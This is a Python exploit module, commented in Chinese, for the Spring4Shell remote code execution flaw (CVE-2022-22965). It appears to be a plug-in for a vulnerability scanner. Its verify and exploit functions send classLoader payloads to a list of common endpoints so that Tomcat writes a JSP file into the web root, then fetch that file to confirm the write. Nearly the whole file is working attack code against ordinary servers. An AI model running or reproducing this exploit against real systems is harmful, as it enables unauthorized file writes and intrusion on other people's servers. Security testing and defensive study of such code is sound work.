#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Spring Framework远程代码执行漏洞 (Spring4Shell) POC
CVE-2022-22965
"""

import re
import requests
import random
import string
from typing import Tuple, Dict, Any, Optional

# POC信息
name = "Spring Framework远程代码执行漏洞 (Spring4Shell)"
description = "Spring Framework 5.3.0 to 5.3.17版本中存在远程代码执行漏洞，攻击者可以在特定条件下利用此漏洞执行任意代码。"
author = "NetTools"
type = "远程代码执行"
severity = "critical"  # 严重程度: critical, high, medium, low, info

def generate_random_string(length=8):
    """生成随机字符串"""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def verify(target: str, session=None, **kwargs) -> Tuple[bool, str]:
    """
    验证目标是否存在漏洞
    
    Args:
        target: 目标URL
        session: 请求会话对象
        **kwargs: 其他参数
        
    Returns:
        (是否存在漏洞, 详细信息)
    """
    # 确保目标URL以/结尾
    if not target.endswith('/'):
        target = target + '/'
    
    # 使用提供的会话或创建新会话
    if session is None:
        session = requests.Session()
    
    # 设置请求超时
    timeout = kwargs.get('timeout', 10)
    verify_ssl = kwargs.get('verify', False)
    
    # 生成随机标记，用于后续检测
    random_mark = generate_random_string()
    
    try:
        # 构造漏洞测试有效载荷
        payload = {
            'class.module.classLoader.resources.context.parent.pipeline.first.pattern': '%25%7Bprefix%7Di%20' + random_mark,
            'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
            'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
            'class.module.classLoader.resources.context.parent.pipeline.first.prefix': random_mark,
            'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': ''
        }
        
        # 常见的Spring应用端点
        potential_endpoints = [
            "",
            "spring",
            "api",
            "api/user",
            "api/users",
            "api/v1",
            "api/v2",
            "api/v3"
        ]
        
        # 尝试所有可能的端点
        for endpoint in potential_endpoints:
            test_url = target + endpoint
            
            # 发送POST请求
            response = session.post(
                test_url,
                data=payload,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=False,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            )
            
            # 检查webshell是否创建成功
            webshell_url = f"{target}{random_mark}.jsp"
            webshell_response = session.get(
                webshell_url,
                timeout=timeout,
                verify=verify_ssl
            )
            
            # 如果成功创建了webshell文件，说明存在漏洞
            if webshell_response.status_code == 200:
                details = f"发现Spring4Shell漏洞(CVE-2022-22965)，成功创建JSP文件: {webshell_url}"
                return True, details
            
            # 检查是否有Java异常，可能也表明漏洞存在但利用不成功
            if "java.lang." in response.text or "org.springframework." in response.text:
                details = f"目标可能存在Spring4Shell漏洞(CVE-2022-22965)，发现Java异常信息"
                return True, details
        
        return False, "目标不存在Spring4Shell漏洞(CVE-2022-22965)"
        
    except requests.RequestException as e:
        return False, f"验证过程中发生请求异常: {str(e)}"
    except Exception as e:
        return False, f"验证过程中发生未知错误: {str(e)}"

def exploit(target: str, session=None, **kwargs) -> Tuple[bool, str]:
    """
    尝试利用漏洞创建webshell
    
    Args:
        target: 目标URL
        session: 请求会话对象
        **kwargs: 其他参数
        
    Returns:
        (是否成功, 结果信息)
    """
    # 确保目标URL以/结尾
    if not target.endswith('/'):
        target = target + '/'
    
    # 使用提供的会话或创建新会话
    if session is None:
        session = requests.Session()
    
    # 设置请求超时
    timeout = kwargs.get('timeout', 10)
    verify_ssl = kwargs.get('verify', False)
    
    # 生成随机标记，用于后续检测
    random_mark = generate_random_string()
    
    try:
        # 构造漏洞利用有效载荷 - 尝试创建一个简单的JSP webshell
        # 注意: 在实际测试中，应该尽量减少对目标系统的实际破坏
        payload = {
            'class.module.classLoader.resources.context.parent.pipeline.first.pattern': '%25%7Bprefix%7Di%20' + random_mark,
            'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
            'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
            'class.module.classLoader.resources.context.parent.pipeline.first.prefix': random_mark,
            'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': ''
        }
        
        # 常见的Spring应用端点
        potential_endpoints = [
            "",
            "spring",
            "api",
            "api/user",
            "api/users",
            "api/v1",
            "api/v2",
            "api/v3"
        ]
        
        # 尝试所有可能的端点
        for endpoint in potential_endpoints:
            test_url = target + endpoint
            
            # 发送POST请求
            response = session.post(
                test_url,
                data=payload,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=False,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            )
            
            # 检查webshell是否创建成功
            webshell_url = f"{target}{random_mark}.jsp"
            webshell_response = session.get(
                webshell_url,
                timeout=timeout,
                verify=verify_ssl
            )
            
            # 如果成功创建了webshell文件，说明利用成功
            if webshell_response.status_code == 200:
                return True, f"漏洞利用成功，webshell地址: {webshell_url}"
        
        return False, "漏洞利用失败，未能创建webshell"
        
    except requests.RequestException as e:
        return False, f"漏洞利用过程中发生请求异常: {str(e)}"
    except Exception as e:
        return False, f"漏洞利用过程中发生未知错误: {str(e)}" 